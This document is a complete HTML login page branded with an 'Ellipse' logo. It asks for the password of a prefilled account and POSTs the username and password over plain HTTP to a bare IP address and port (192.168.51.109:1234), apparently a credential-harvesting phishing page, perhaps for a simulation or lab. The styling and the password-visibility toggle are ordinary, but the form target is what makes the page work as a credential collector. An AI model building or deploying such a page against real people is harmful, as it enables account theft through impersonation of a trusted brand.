<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    /* Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: white;
      width: 350px;
      padding: 30px 25px;
      border-radius: 10px;
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .logo img {
      width: 50px;
      height: 50px;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 20px;
      color: #333;
      margin-bottom: 8px;
    }

    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 25px;
    }

    .form-group {
      position: relative;
      margin-bottom: 20px;
      text-align: left;
    }

    .form-group label {
      display: block;
      font-size: 12px;
      color: #666;
      margin-bottom: 6px;
    }

    .form-group input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    .edit-button {
      position: absolute;
      top: 32px;
      right: 10px;
      background: none;
      border: none;
      color: #673ab7;
      cursor: pointer;
      font-size: 14px;
    }

    .show-password {
      position: absolute;
      top: 32px;
      right: 10px;
      background: none;
      border: none;
      color: #666;
      cursor: pointer;
    }

    .forgot-password {
      display: block;
      text-align: right;
      margin-top: -10px;
      margin-bottom: 20px;
      color: #673ab7;
      text-decoration: none;
      font-size: 13px;
    }

    .continue-button {
      width: 100%;
      padding: 12px;
      background-color: #673ab7;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .signup-link {
      margin-top: 20px;
      font-size: 13px;
      color: #666;
    }

    .signup-link a {
      color: #673ab7;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://core-ellipse-logo.s3.amazonaws.com/ellipse-logo.png" alt="Ellipse Logo" />
    </div>
    <h2>Enter Your Password</h2>
    <p>Enter your password to continue</p>
    <form action="http://192.168.51.109:1234" method="POST">
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" value="test@gmail.com" readonly />
        <button type="button" class="edit-button">Edit</button>
      </div>
      <div class="form-group">
        <label for="password">Password*</label>
        <input type="password" id="password" name="password" required />
        <button type="button" class="show-password" onclick="togglePassword()">
          👁️
        </button>
      </div>
      <a href="#" class="forgot-password">Forgot password?</a>
      <button type="submit" class="continue-button">Continue</button>
      <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
    </form>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      if (pwd.type === "password") {
        pwd.type = "text";
      } else {
        pwd.type = "password";
      }
    }
  </script>
</body>
</html>
